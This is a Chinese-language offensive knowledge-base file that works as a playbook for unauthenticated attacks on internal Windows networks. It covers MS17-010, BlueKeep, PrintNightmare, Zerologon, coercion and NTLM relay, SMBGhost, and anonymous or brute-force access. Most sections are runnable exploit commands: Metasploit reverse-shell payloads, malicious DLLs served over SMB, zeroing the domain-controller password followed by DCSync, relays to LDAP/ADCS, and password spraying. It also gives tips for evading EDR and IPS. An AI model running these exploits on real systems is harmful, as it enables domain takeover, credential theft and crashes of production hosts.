---
name: kb-boundary-unauth-rce
description: 内网/域边界未授权 RCE 打点专题纵深——MS17-010 / BlueKeep / PrintNightmare(+SpoolFool) / Zerologon / Coerce 强制认证 / SMBGhost 等未授权漏洞的利用细节、请求构造、判定门槛与打点顺序方法论。已按 2024-2026 最新情报修订（含 CVE-2025-33073 NTLM 反射串联）
tags: [内网渗透, 边界打点, 未授权RCE, MS17-010, BlueKeep, PrintNightmare, Zerologon, Coerce, SMBGhost, NTLM]
date: 2026-08-14
---

# 域内/内网边界未授权 RCE 打点专题纵深

> 与 `kb_intranet_lateral_domain_2026.md`（全链路概览）互补。本文只讲**未授权/低权直通 SYSTEM 的边界打点漏洞**：每个漏洞给出可运行命令、请求构造、判定门槛、2024-2026 补丁与绕过现状、真实危害。
> 目标画像：已进入内网（或已有 WebShell），要拿第一台 SYSTEM / 域控。**无凭据 → 本文件；有凭据 → 概览手册的横移/域渗透章节。**

---

## §0 打点顺序方法论（先看这张）

**内网存活发现 → 服务指纹判定 → 漏洞指纹判定 → 利用 → 验证 → 后渗透衔接**，逐段收敛：

```bash
# ① 存活+全端口发现（fscan 单二进制，Win/Linux 通吃）
fscan -h 192.168.10.0/24                       # 默认常见端口 + 常见漏洞 + 弱口令
fscan -h 192.168.10.1-254 -p 1-65535 -np       # 大网段：先默认扫再按需扩，避免漏非标端口
# ② 对存活主机做 SMB/RDP/AD 专项目标识别（判断打哪个洞）
nmap -Pn -p 445,139,3389,5985,88,389,135 192.168.10.0/24 -oG smb_hosts.txt
# ③ 漏洞指纹批量判定（一次列全，看哪些"可直接打"）
nmap -p 445 --script smb-protocols,smb-vuln-ms17-010,smb-security-mode,smb-os-discovery <ip>
nxc smb <ip> -u '' -p ''                       # 匿名/空会话 → 列共享/用户（见 §7）
```

**打点优先级（对真实目标的影响排序）**：
1. **域控/域内主机未授权洞**（Zerologon、PrintNightmare DC、MS17-010 DC）→ 直接域接管，最高价值。
2. **边界机 SYSTEM 洞**（MS17-010、BlueKeep、SMBGhost）→ 拿到第一台 SYSTEM，凭据与横移起点。
3. **强制认证 + Relay 链**（PetitPotam/PrinterBug 等 → ntlmrelayx → LDAP/ADCS）→ 低权域用户打域控。
4. **匿名/弱配置面**（IPC$ 空会话、guest 登录、RDP 爆破）→ 信息收集 + 弱口令兜底。

**判定门槛（SRC 汇报标准）**：未授权洞必须是"无有效凭据 + 稳定复现 + 拿到 SYSTEM/域控级结果"。仅证明"端口开放/服务存在"不算漏洞（见全局判定规则）。

---

## §1 MS17-010 永恒之蓝（CVE-2017-0144）

### 原理
SMBv1 处理 `SMB_COM_TRANSACTION2` 的 FEALIST 时，`srv.sys` 的 `SrvOs2FeaListSizeToNt()` 错误计算 FEA 结构转换后的大小 → 内核**非分页池溢出** → 覆盖 `SRVNET_BUFFER` 达到任意内存写 → 内核 shellcode → 向 `lsass.exe`/`spoolsv.exe` 等 SYSTEM 进程注入 APC 执行用户态 payload。无需任何凭据。

### 影响范围（补丁前）
XP x86 / 2003 x86 / 7 x86/x64 / 2008 R2 x64 / 8.1 x64 / 2012 R2 x64 / Win10 x64(**<1507**)。**SMBv1 必须启用**——后文判定第一件事就查这个。

### 判定（如何确认存在）
```bash
# ① 先确认 SMBv1 存在（SMBv1 被禁用则直接停，不中）
nmap -Pn -p 445 --script smb-protocols <ip>          # 看输出是否含 "dialect: SMB 1.0"
# ② 漏洞确认（nse 脚本判 VULNERABLE）
nmap -Pn -p 445 --script smb-vuln-ms17-010 <ip>
# ③ 或 msf 模块自带的 check（据称最准：微软补丁本身泄露了可利用信息）
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS <ip>; check
# ④ 加 OS 上下文：nmap --script smb-os-discovery <ip> 或 nxc smb <ip>
```

### 利用（msf 完整参数）
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS <目标IP>                    # 目标
msf6 > set LHOST <攻击机IP>                    # 回连地址（隧道/跳板时设为可达地址）
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set ProcessName spoolsv.exe             # APC 注入的 SYSTEM 进程，默认 lsass.exe 也行
msf6 > set GroomAllocations 12                 # 池整理(内存喷射)基础包数，默认即可
msf6 > set MaxExploitAttempts 1                # 重试次数(XP/7/2008R2 池整理常首轮失败，调大)
msf6 > set GroomDelta 5                        # 每轮失败后额外喷射增量
msf6 > run
# 拿到 session 后立刻验证权限
meterpreter > getuid                           # 应为 NT AUTHORITY\SYSTEM
```

### 利用（手工 AutoBlue 工具链，非 msf）
```bash
git clone https://github.com/worawit/MS17-010.git  # 含 eternalblue_exploit7/8.py + mysmb.py
cd MS17-010; pip install -r requirements.txt
# ① 漏洞判定
python eternal_checker.py <目标IP>              # 返回 SMBv1 存在 + 是否可打
# ② 生成内核 shellcode（shellcode/ 目录，可选 msfvenom 生成反向 shell 合并）
cd shellcode && ./shell_prep.sh                 # 生成 sc_all.bin（默认 bind shell）
# ③ 打（win7/2008 R2 用 exploit7，win8/8.1/2012R2 x64 用 exploit8）
python eternalblue_exploit7.py <目标IP> shellcode/sc_all.bin
nc -nv <目标IP> 4444                            # 若默认 bind shell，连接之
# 有凭据场景另一经典：42315.py + mysmb.py（ZDI 公开版），改脚本内账号密码后执行
```

### 常见坑与绕过
- **SMBv1 被禁用**：Win10/Server 2016 后默认关闭 SMBv1，`smb-protocols` 无 SMB 1.0 即不可打。
- **架构不可从 SMB 头判断**：x86/x64 打错会静默失败，无 shell 就换 PAYLOAD 架构重试。
- **池整理失败/被 IPS 掐断会蓝屏**：目标为生产机时谨慎，重试间隔拉开。
- **匿名访问限制**：Vista+ 默认禁止匿名访问命名管道，Win8+ 禁匿名 IPC$——对新系统需先有凭据（但 SMBv1 时代主机基本都能匿名打）。
- **EDR/防火墙**：445 出网被封则 msf 回连不通，改用 `windows/x64/meterpreter/reverse_https` 或隧道（Ligolo-ng 的 tun 接口天然可达内网）。

### 危害评估
未授权 → **NT AUTHORITY\SYSTEM**，WannaCry 即此洞。内网老机器（工控/老办公机/未维护服务器）命中率高，是红队内网打点的"第一发子弹"。拿到 SYSTEM 后抓 SAM/LSASS → 横向。

---

## §2 BlueKeep RDP（CVE-2019-0708）

### 原理
RDP 服务 `termdd.sys` 在处理 `MS-T-121` 通道时对对象引用计数有缺陷 → **use-after-free** → 未授权攻击者构造恶意通道连接序列 → 内核任意代码执行。CVSS 10.0，无需凭据。

### 影响范围与利用条件
- 影响：**XP / Vista / 7 / 2003 / 2008 / 2008 R2**；Win8+ / Server 2012+ **不中**。
- 条件：RDP 3389 开放 + 未打补丁 + **NLA（网络级认证）关闭**。NLA 开启则不可利用。

### 判定
```bash
msf6 > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
msf6 > set RHOSTS <ip>; run
# 输出 "VULNERABLE" 表示可打；"Not Exploitable" 多为 NLA 开启或 OS 不在范围
# 备选独立扫描器：python rdpscan.py <ip>   （zerosum0x0/CVE-2019-0708）
nmap -p 3389 --script rdp-ntlm-info <ip>      # 顺带确认 OS + NLA 状态
```

### 利用（msf 完整参数）
```bash
msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf6 > set RHOSTS <目标IP>
msf6 > set LHOST <攻击机IP>
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
# 模块不支持自动 target：必须手工指定（内核内存布局因 OS 而异）
msf6 > show targets                          # 看可选：Windows 7 x64 / 2008 R2 x64 等
msf6 > set TARGET 1                          # 0=x64 虚拟, 1=x64 物理（按目标实际环境选）
msf6 > run
# 成功 → SYSTEM 级 meterpreter（exploit 内部拉起 spoolsv.exe 子进程）
```

### 常见坑与绕过
- **Server 版需改注册表**（音频共享）才能打成功：`HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp` → `fDisableAudioCapture` 相关配置，否则利用失败。
- **打错 target / 利用被打断 = 目标蓝屏**（内核崩溃）。IPS 检测到 meterpreter 特征掐断流量也会触发。生产主机务必先确认 target 再打。
- **NLA 开启**：扫描器直接判 not exploitable；可尝试 `xfreerdp` 先用凭据登录绕过（但那就不是未授权了）。
- **2024-2026 现状**：洞已 6 年，公网几乎绝迹；**内网老 XP/2008 R2 桌面机仍常见**，且常被挖矿木马利用。msf 模块仍在维护（master 分支）。攻击痕迹检测：`spool\svchost.exe` + SHA1 `82288c2dc5c63c1c57170da91f9979648333658e` 挖矿载荷。

### 危害评估
未授权 → 内核级 SYSTEM，可装持久化、横向、矿机。内网遗留 Win7/2008R2 是主目标。打点失败成本高（蓝屏），先扫描再打。

---

## §3 PrintNightmare 及变体（CVE-2021-1675 / CVE-2021-34527 / SpoolFool CVE-2022-21999）

### 原理
Windows Print Spooler 服务（`spoolsv.exe`）允许**远程安装打印机驱动**，且不校验驱动 DLL 来源 → 攻击者把恶意 DLL 放 SMB 共享，诱导 spoolsv 加载 → DLL 以 **SYSTEM** 执行。
- **两态**：CVE-2021-1675 = **LPE**（本地低权 → SYSTEM）；CVE-2021-34527 = **RCE**（域内低权凭据 → 远程 SYSTEM）。触发入口都是 `DriverPath` 指向攻击者共享。

### 前置条件
- Print Spooler 服务运行（**域控默认开**，直到 2022 后才建议禁）。
- RCE 态需要**任意有效域账号**（低权即可，如普通员工账号）+ SMB 445 出网可达。
- 主机未装补丁，或只装了补丁但**没做注册表加固**（很多环境只跑 Windows Update，漏了 GPO 加固，仍可打）。

### 判定
```powershell
sc query spooler                  # 在已控主机查服务状态；远程：445 可达 + 目标未加固
```
```bash
rpcclient -U 'user%pass' <ip> -c 'ncacn_np:spoolss'   # 确认 spoolss 命名管道可连
# 或用 nmap/自研脚本探测目标是否仍允许远程驱动安装（补丁后默认仍允许至 2022-03）
nmap -p 445 --script smb-protocols <ip>
```

### 利用（RCE，impacket 全套）
```bash
# ① 攻击机起 SMB 共享托管恶意 DLL（evil.dll 由 msfvenom 生成）
sudo impacket-smbserver evil /tmp/evil_share -smb2support
# ② 用 CVE-2021-1675.py（ly4k）触发加载，目标用 spoolsv 以 SYSTEM 加载 \\attacker\evil\evil.dll
python3 CVE-2021-1675.py 'corp.local/user:Pass@<目标IP>' '\\<攻击机IP>\evil\evil.dll'
# ③ 或 msf 模块
msf6 > use exploit/windows/smb/printnightmare
msf6 > set RHOSTS <目标IP>; set SMBUser user; set SMBPass Pass; set SHARE evil; run
# ④ LPE 态（本机低权→SYSTEM，PowerShell 一键加本地管理员）
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -DriverName "Generic" -NewUser "evil" -NewPassword "EvilPass1!"
```

### SpoolFool 与 2024-2026 现状
- **SpoolFool CVE-2022-21999**（LPE）：`SetPrinter()` RPC 把数据写进注册表路径 + **目录 junction 劫持** → 低权写任意文件 → SYSTEM。工具 `SpoolFool.exe`（ly4k C#）。CVE-2022-41073/41095 是后续同类 Print Spooler 提权。
- **2023-2025 系列**：CVE-2023-21674、CVE-2023-28238 等，Print Spooler 成为"bug 常青树"，**2024-2025 每季度仍有新洞被发现**（研究者语："PrintNightmare 没死"）。
- **为什么打不死的核心**：早期补丁只封了 RPC 路径，**没封注册表加固项**。完整修复必须：
  ```
  HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
    NoWarningNoElevationOnInstall=0（默认仍可能为1 → 静默提权到 SYSTEM）
    UpdatePromptSettings=0
  HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\RestrictDriverInstallationToAdministrators=1
  ```
- **当前可用面**：只要 spooler 在跑 + 未做上述加固，老手法仍打；域控上 spooler 仍开的，= 任意域用户 → 域控 SYSTEM 的备用通道。

### 常见坑与绕过
- **补丁状态判断**：只看是否装了 2021-08 之后补丁不够，要确认 `RestrictDriverInstallationToAdministrators` 与 Point-and-Print 策略值。
- **EDR 拦截**：DLL 从网络共享加载是经典行为告警（Sysmon Event 7），改用无文件/内存 DLL、或把 DLL 放目标可达的内部共享。
- **SMB 加密**：SMBv3 加密时签名/内容检测困难，但也让 impacket-smbserver 需 `-smb2support`。
- **DC 上 spooler 默认状态**：微软始终未在补丁里自动禁用；红队遇 DC spooler 开着=大礼包。

### 危害评估
**域内任意低权用户 → 域控 SYSTEM → DCSync → 域接管**。这是除 Zerologon 外"低门槛打域控"的最经典路径。2026 仍活跃。

---

## §4 Zerologon（CVE-2020-1472）

### 原理
域控 NETLOGON 服务（MS-NRPC）用 **AES-CFB8** 计算会话密钥。攻击者无需凭据即可建立 Netlogon 通道，通过构造 256 个不同的全零 client credential——利用 CFB8 的分组性质，**约 1/256 概率**使会话密钥全零 → 校验通过 → 攻击者以空密钥认证 → 可调用 `NetrServerPasswordSet2` 把 DC 机器账户密码**置空**。之后用空密码 DCSync。

### 前置条件
- 目标 = **域控**，未打 2020-11/2021 补丁。影响 Server 2008 R2 → 2019（Samba 亦受影响）。
- 无需任何凭据，仅需 TCP 445 可达。

### 利用（零信任探测 → 打空密码 → DCSync → 恢复）
```bash
# ① 判定：无副作用探测脚本（只测是否可建立弱会话，不改密码）
python3 zerologon_probe.py <DC_IP>                  # 输出 DC 是否受影响（未打补丁=可打）
# ② 打空密码（原始脚本 zerologon.py 或 2024 impacket 版）
python3 zerologon.py <DC_主机名> <DC_IP>            # 成功后 DC 机器账户密码=空
# ③ 用空密码直接 DCSync（拿 krbtgt + 所有账户哈希）
python3 secretsdump.py -just-dc -no-pass <DC_主机名>$@<DC_IP>
# ④ 拿完立即恢复 DC 机器密码（必须！否则域内复制/DNS 等服务挂）
python3 reinstall_original_pw.py <DC_主机名> <DC_IP> <hex_original_pw>
# 或 impacket 系全链（2024 更新 PoC：TuanCui22/ZerologonWithImpacket）
set_empty_pw.py <DC_IP> && secretsdump.py -just-dc -no-pass 'DC01$@<DC_IP>' \
  && wmiexec.py -hashes :<Administrator_NTLM> 'corp/Administrator@<DC_IP>'
```

### 2024-2026 修复与利用现状
- 微软补丁分两阶段：2020-08（客户端）→ 2020-11（DC 默认拒绝弱会话）。全补丁环境**不可直接打**。
- 但**兼容模式**（`FullSecureChannelProtection` / `RequireStrongKey` 未强制）仍允许攻击者把客户端降级——**域内若存在未打补丁的机器账户/其他 DC**，可利用 relay 到脆弱机器再中转。2024 年 PoC 更新版说明未打补丁的 2016/2019 DC 依然能稳定拿下。
- **判定门槛**：直接跑探测脚本看是否"可建立弱会话"。nxc 无专门模块，用独立脚本最准。

### 常见坑与绕过
- **改空密码是破坏性动作**：必须先记下原始机器密码哈希（`secretsdump` 时顺带存 `MSA`/机器密码），打完**立即恢复**，否则域功能中断 = 违反"不破坏可用性"边界。
- **2008 R2 无 `net user` 恢复通道**：用脚本里的 `reinstall_original_pw.py` 直接回写。
- **防火墙**：445 要通；SMB 签名不拦此洞（走的是 NETLOGON RPC）。
- **EDR**：域控一般少装，但 `NetrServerPasswordSet2` 调用是行为告警点，打点前评估噪声。

### 危害评估
未认证 → 域控机器账户空密码 → DCSync 全域哈希 → **域完全接管**。内网遗留老 DC（未补丁）是最高价值目标。

---

## §5 强制认证 Coerce 类（PetitPotam / PrinterBug / DFSCoerce / ShadowCoerce）

### 原理
Windows 各 RPC 服务的函数接收 **UNC 路径**参数，目标服务会主动用**机器账户**去访问该路径 → 攻击者指定 `\\攻击机IP\...` → 目标机器账户把 NTLM 认证发到攻击机 → 抓包（破解/彩虹表）或 **relay**（转发到 SMB/LDAP/ADCS 打更高价值）。**核心是把"认证"变成"命令执行"的原材料**。

| 名称 | 协议/管道 | 触发函数 | 备注 |
|------|-----------|---------|------|
| PetitPotam | MS-EFSRPC `\PIPE\efsrpc` | `EfsRpcOpenFileRaw` 等 9+ 方法 | 最通用；2022 后需有效域用户（CVE-2022-26925 封了匿名） |
| PrinterBug/SpoolSample | MS-RPRN `\PIPE\spoolss` | `RpcRemoteFindFirstPrinterChangeNotification` | 需 Print Spooler 运行；新系统仅 DCERPC 可用 |
| DFSCoerce | MS-DFSNM `\PIPE\netdfs` | `NetrDfsRemoveStdRoot` / `AddStdRoot` | 主要打域控（DFS 命名空间服务） |
| ShadowCoerce | MS-FSRVP `\PIPE\FssagentRpc` | `IsPathSupported` | 需 File Server VSS Agent 服务 |
| CheeseOunce | MS-EVEN `\PIPE\eventlog` | `ElfrOpenBELW` | 打备份事件日志 |

### 前置条件
- PetitPotam：**任意有效域用户**（低权即可）+ 目标 445 可达。
- PrinterBug：目标 Print Spooler 运行（大多数工作站/服务器开，Server Core 不开）。
- DFSCoerce/ShadowCoerce：目标开启对应服务（DC 上 DFS 命名空间服务通常在）。

### 触发命令（攻击机 = relay/抓包端）
```bash
# ① 抓包端（Relay 到 SMB 执行）——先起监听再触发
sudo impacket-ntlmrelayx -t smb://<目标> -smb2support -c 'whoami'
# 或 relay 到 LDAP 打 RBCD / ADCS ESC8（拿域控证书）
sudo impacket-ntlmrelayx -t ldap://<DC> --delegate-access
sudo impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController

# ② 各触发工具（换个终端跑）
python3 PetitPotam.py -u user -p Pass <攻击机IP> <目标IP>          # EFSRPC
python3 PetitPotam.py <攻击机IP> <目标IP>                          # 免认证版（老环境）
SpoolSample.exe <攻击机IP> <目标IP>                                # PrinterBug（Win 编译版）
python3 Coercer.py coerce -l <攻击机IP> -t <目标IP> -u user -p Pass   # 全协议自动化
python3 dfscoerce.py -u user -p Pass <攻击机IP> <目标IP>           # DFSCoerce
python3 shadowcoerce.py <攻击机IP> <目标IP>                        # ShadowCoerce
```

### 判定
```bash
# Coercer 的 scan 模式探测目标哪些协议/函数可被强制认证
python3 Coercer.py scan -t <目标IP> -u user -p Pass
# 判断 relay 可行性：目标 SMB 是否强制签名（不强制=可 relay 打 SMB）
nmap -p 445 --script smb-security-mode <目标IP>   # "signing enabled but not required" = 可打
```

### 2024-2026 现状与串联
- **PetitPotam 是"最通用的那个"**：全补丁的 Server 2022/2025 上，EFSR 经常是**唯一还能用的**强制认证面（微软说"PetitPotam 修不掉，这是特性"）。nxc 的 `efsr_spray` 模块可通过在可达 SMB 共享上创建加密文件来激活 EFS 服务。
- **PrinterBug 新限制**：Win11 22H2 / Server 2025 起仅 DCERPC 通道可用（SMB/HTTP 被砍）。
- **与 WebClient 串联做 HTTP relay**：`.searchConnector-ms` 文件放在 SMB 共享可程序化拉起 WebClient → 强制认证走 HTTP → relay 到 ADCS/HTTP 面（ESC8 等）。
- **CVE-2025-33073（NTLM 反射复活，2025-06）**：任意低权域用户 + 目标未强制 SMB 签名 → 构造含 `CREDENTIAL_TARGET_INFORMATION` 的 DNS 记录诱导目标对自己认证 → 反射回原主机 → **SYSTEM on 未强制签名的域内机（含 DC）**。工具 `cupntlm`（DNS 注入 + PetitPotam + ntlmrelayx 自动化）。SMB 签名仍是唯一防护开关。详见概览手册 §5.4。
- **NTLMv1 彩虹表链**：Responder 固定挑战 `1122334455667788` + `--disable-ess --lm`，配合 PetitPotam 强制 DC 认证 → 抓 Net-NTLMv1 → 用 Mandiant 公开 8.6TB 彩虹表（bucket `net-ntlmv1-tables`）12 小时内解出 → 域接管。前提：目标允许 NTLMv1（老配置）。

### 常见坑与绕过
- **签名强制**：目标 SMB 强制签名时 relay 打不了 SMB → 改 relay 到 LDAP / HTTP(ADCS) / RPC。nmap `smb-security-mode` 先看。
- **EPA / LDAP channel binding**（Server 2025 默认开）：封 relay 到 LDAP，但只对**新装**系统生效，升级上来的旧配置仍可打。
- **触发失败排查**：服务没起（spooler 停了/EFS 服务未激活）→ 用 Coercer fuzz 或 nxc `efsr_spray` 先激活。
- **EDR 行为告警**：`\\IP\...` 的 Netlogon/EFS 流量是重点监控，配合正常业务流量掩护或换协议。

### 危害评估
低权域用户 → 强制 **DC 机器账户** 认证 → relay 到 LDAP 写 ACL/RBCD、到 ADCS 拿域控证书、或抓 NTLMv1 彩虹表 → **域接管**。这是当前域环境最"低门槛高回报"的链路，2026 依然活跃。

---

## §6 SMBGhost（CVE-2020-0796）

### 原理
SMBv3.1.1 压缩功能：`srv2.sys` 的 `Srv2DecompressData()` 未校验压缩头里的 `OriginalCompressedSegmentSize` / `Offset` → 恶意包（如 offset 设 `0xFFFFFFFF`）触发**整数溢出 → 内核堆溢出** → RCE / LPE / 蓝屏。无需凭据，仅 SMB 445。

### 影响范围与条件
- Win10 **1903 / 1909**（x86/x64/ARM64）、Server **1903 / 1909**（Core）。
- SMB **3.1.1 且压缩开启**（默认开）。注册表 `DisableCompression` 可关掉 → 不受影响。

### 判定
```bash
nmap -Pn -p 445 -O <ip>                        # 确认 OS build 是否为 1903/1909
nmap -p 445 --script smb-protocols <ip>        # 确认 dialect 含 3.1.1
# msf 模块 check：自动读 build 号 + DisableCompression 注册表
msf6 > use exploit/windows/smb/cve_2020_0796_smbghost; set RHOSTS <ip>; check
# 或 Ladon：Ladon <ip> SMBGhost；奇安信扫描器：dl.qianxin.com CVE-2020-0796-Scanner
```

### 利用
```bash
# ① DoS / 验证（eerykitty PoC，能蓝屏即确认存在，慎用）
./CVE-2020-0796.py <目标IP>
# ② RCE（msf，成功得 spoolsv.exe 里的 SYSTEM）
msf6 > use exploit/windows/smb/cve_2020_0796_smbghost
msf6 > set RHOSTS <目标IP>; set LHOST <攻击机IP>
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp; run
# ③ LPE（本地提权，目标 1903/1909 x86/x64，注入 winlogon.exe）
msf6 > use exploit/windows/local/cve_2020_0796_smbghost
msf6 > set SESSION <已控session>; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run
```

### 常见坑与绕过
- **远程 RCE 利用难、且目标 ~90 分钟内必蓝屏**：公开 RCE 链（chompie1337 等）成功率高但会崩，打完立刻落持久化并让目标重启。
- **压缩被关**：`DisableCompression=1` 则不可打，check 先看。
- **OS 范围极窄**：1903/1909 已停止服务，公网几乎绝迹，**内网遗留快速部署的 Server 2019/1909 仍可能中**。
- **EDR**：触发点是畸形 SMB 压缩包，IPS 已有签名（如 Fortinet `MS.SMB.Server.Compression.Transform.Header.Memory.Corruption`）。

### 危害评估
未授权 → SYSTEM（含内核），但稳定性差。实战更多用作**边界机 LPE**（先拿低权再提权）或配合其他链。价值低于 MS17-010/Zerologon。

---

## §7 其他高频边界洞（匿名面 / 弱配置面）

### 7.1 SMB 空会话 / 匿名共享（信息收集起点）
```bash
# 判定 + 枚举（NetExec，继承 CME）
nxc smb <ip> -u '' -p ''                       # 空会话登录测试
nxc smb <ip> -u '' -p '' --shares              # 列共享（找可读 NETLOGON/SYSVOL/Users）
nxc smb <ip> -u '' -p '' --users --groups      # SAMR 枚举域用户/组
nxc smb <ip> -u '' -p '' --rid-brute           # SID/RID 循环爆破有效用户名（RID 500/501 必在）
nxc smb <ip> -u '' -p '' --pass-pol            # 密码策略（爆破参数）
# 传统三件套
smbclient -N -L //<ip>                          # 列共享
rpcclient -N -U "" -c 'enumdomusers' <ip>       # 匿名枚举域用户
enum4linux-ng -A <ip>                           # 全量匿名扫描（OS/用户/组/共享/策略）
smbmap -H <ip> -u '' -p ''                      # 共享+读写权限矩阵
```
- **2025 新特性**：nxc 配置 `check_guest_account=true` 后，无凭据直连自动检测 guest 登录是否开（`Guest: True`）；guest 可用可做后续 Coerce/横向。
- **判定门槛**：空会话能枚举出**真实用户名/共享**才算信息泄露信号；`STATUS_ACCESS_DENIED`=已加固，不构成漏洞。

### 7.2 RDP 爆破 / 密码喷洒（低技术兜底面）
```bash
# 单目标 RDP 爆破
hydra -L users.txt -P pass.txt rdp://<ip> -t 4
ncrack -U users.txt -P pass.txt rdp://<ip>
crowbar -b rdp -s <ip>/32 -u administrator -C pass.txt     # 支持 NLA 场景
# 域内密码喷洒（低强度多用户单密码，避锁定）
nxc smb <域> -u users.txt -p 'Spring@2026' --continue-on-success
# RDP PTH（拿到 NTLM 后直连，需 RestrictedAdmin 模式）
xfreerdp3 /u:admin /v:<ip> /pth:<NTLM>
```
- **坑**：RDP 爆破触发账号锁定/防火墙封 IP；域策略有阈值时转喷洒。爆破低频慢速可绕。

### 7.3 NetBIOS / SMB 信息泄露（识别 DC 与主机角色）
```bash
nbtscan 192.168.10.0/24                        # 主机名 + MAC（<20> 后缀 = 文件服务，可判域控）
nmap -p 139,445 --script smb-os-discovery,smb2-security-mode <ip>
# 无认证枚举 MS-RPC（Kaspersky 2024 研究）：IOXIDResolver/IObjectExporter TCP 135
python3 ms-rpc-enum.py <DC_IP>                 # 泄露 DC 网络接口 IP（辅助找网段）
```

### 7.4 域控 NTLM 探测（评估是否可走 NTLMv1 / relay 链）
```bash
nmap -p 445 --script smb-security-mode <DC_IP>     # signing required?（required=DC 默认）
# 探测 NTLMv1 是否允许（决定能否走彩虹表链）
python3 ntlmv1-check.py <DC_IP>                    # 发起 NTLMv1 协商，看是否被拒
# 或直接上 Responder + 强制认证链见 §5：Challenge=1122334455667788 + --disable-ess --lm
```

---

## §8 打点顺序速查（一句话版）

```
fscan 全段存活/端口 → nmap 445/3389/135 专项 → SMBv1/MS17-010/BlueKeep/SMBGhost 判定脚本
→ 未打补丁老机器直接 msf/AutoBlue 打（§1-2,6）→ 域控上 Zerologon 探测+打空密码（§4）
→ 有低权域用户则 Coercer scan → PetitPotam/PrinterBug + ntlmrelayx → LDAP/ADCS（§5）
→ 全部失败 → 匿名/guest 枚举 + 弱口令兜底（§7）→ 拿到 SYSTEM 后接概览手册横移/域渗透章节
```

## Sources（2024-2026 核对）
- MS17-010 msf 模块文档（含影响版本/选项/架构坑）— https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/exploit/windows/smb/ms17_010_eternalblue.md
- AutoBlue-MS17-010（exploit7/8 + eternal_checker + shell_prep）— https://github.com/kill3rbee007/AutoBlue-MS17-010 · DeepWiki 技术拆解 — https://deepwiki.com/worawit/MS17-010
- BlueKeep msf 利用/扫描器 — https://www.rapid7.com/blog/post/2019/09/06/initial-metasploit-exploit-module-for-bluekeep-cve-2019-0708/ · 扫描器文档 — https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.md
- PrintNightmare 原理解析（Nozomi）— https://www.nozominetworks.com/blog/printnightmare-remote-code-execution-in-windows-spooler-service · 2026 存活评估 — https://ringsafe.in/printnightmare-2026-still-alive/ · 完整修复加固清单 — https://www.techbloat.com/how-to-fully-patch-the-printnightmare-vulnerability.html
- ly4k PrintNightmare/SpoolFool 工具集 — https://repos.ecosyste.ms/hosts/GitHub/owners/ly4k
- Zerologon 2024 impacket PoC（set_empty_pw + secretsdump + wmiexec）— https://github.com/TuanCui22/ZerologonWithImpacket-CVE2020-1472
- Coerce 全协议对照表（PetitPotam/PrinterBug/ShadowCoerce/DFSCoerce/CheeseOunce）— https://h3ll-ka1ser.gitbook.io/boot2root/active-directory-penetration-testing/mitm-listen-and-relay/petitpotam-printerbug-shadowcoerce-dfscoerce-cheeseounce · Coercer 工具 — https://github.com/p0dalirius/Coercer · 2025 现状（EPA/WebClient/kerberos 演进）— https://cybernoz.com/windows-authentication-coercion-attacks-present-major-risks-to-enterprise-networks/
- CVE-2025-33073 NTLM 反射（Synacktiv 深度分析）— https://halloween.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025 · cupntlm 自动化利用 — https://github.com/EgCupCake/cupntlm-Automated-Exploit-For-CVE-2025-33073- · 分层模型影响 — https://www.praetorian.com/blog/cve-2025-33073-ntlm-reflection-one-hop/
- SMBGhost msf 模块（原理/90min BSOD/check）— https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/cve_2020_0796_smbghost.md · DoS PoC — https://github.com/eerykitty/CVE-2020-0796-PoC · RCE 复现分析 — https://cloud.tencent.com.cn/developer/article/2442231
- 空会话/guest 枚举（NetExec 2025 check_guest_account）— https://www.netexec.wiki/smb-protocol/enumeration/enumerate-null-sessions · 无认证 MS-RPC 枚举（Kaspersky）— https://securelist.com/no-auth-domain-information-enumeration/112629/
- NTLMv1 彩虹表打 DC（固定挑战 + Mandiant 8.6TB 表）— https://adscanpro.com/blog/ntlmv1-dc-rainbow-tables-domain-compromise · relay 演化（SpecterOps 445 之外）— https://specterops.io/blog/2025/07/24/escaping-the-confines-of-port-445-ntlm-relay/
